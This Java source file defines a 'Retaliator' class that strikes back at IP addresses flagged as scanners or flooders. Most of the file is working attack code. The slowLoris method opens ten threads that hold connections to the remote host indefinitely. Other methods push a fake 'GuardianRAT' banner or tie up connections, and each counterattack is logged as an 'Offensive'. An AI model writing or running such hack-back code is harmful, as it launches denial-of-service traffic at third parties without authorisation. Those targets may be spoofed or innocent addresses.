package com.mystycdh.security;

import java.io.*;
import java.net.*;
import java.util.*;

public class Retaliator {

    private static final Set<String> knownScanPorts = Set.of("1337", "8888", "5555", "3389", "23", "22", "445");
    private static final List<String> flaggedIPs = Collections.synchronizedList(new ArrayList<>());

    public static void retaliate(String ip, int port, String reason) {
        if (flaggedIPs.contains(ip)) return;

        flaggedIPs.add(ip);
        log(ip, port, reason);

        switch (reason.toLowerCase()) {
            case "masscan":
            case "syn_flood":
                slowLoris(ip, port);
                break;
            case "http_flood":
                injectBanner(ip, port);
                break;
            default:
                tarPit(ip, port);
        }
    }

    private static void injectBanner(String ip, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(ip, port), 1000);
            OutputStream out = socket.getOutputStream();
            out.write("HTTP/1.1 403 Forbidden\r\nServer: GuardianRAT\r\n\r\n".getBytes());
            out.flush();
        } catch (IOException ignored) {}
    }

    private static void slowLoris(String ip, int port) {
        for (int i = 0; i < 10; i++) {
            new Thread(() -> {
                try (Socket s = new Socket(ip, port)) {
                    PrintWriter out = new PrintWriter(s.getOutputStream(), true);
                    out.println("GET / HTTP/1.1");
                    while (true) {
                        Thread.sleep(15000); // keep-alive payload
                        out.println("X-Keep-Alive: Guardian");
                        out.flush();
                    }
                } catch (Exception ignored) {}
            }).start();
        }
    }

    private static void tarPit(String ip, int port) {
        new Thread(() -> {
            try (Socket s = new Socket()) {
                s.connect(new InetSocketAddress(ip, port), 1000);
                Thread.sleep(60000);
            } catch (Exception ignored) {}
        }).start();
    }

    private static void log(String ip, int port, String reason) {
        System.out.printf("[Retaliator] ⚠️ Offensive triggered against %s:%d [%s]%n", ip, port, reason);
        // You could also write this to a file or call a Discord webhook here
    }
}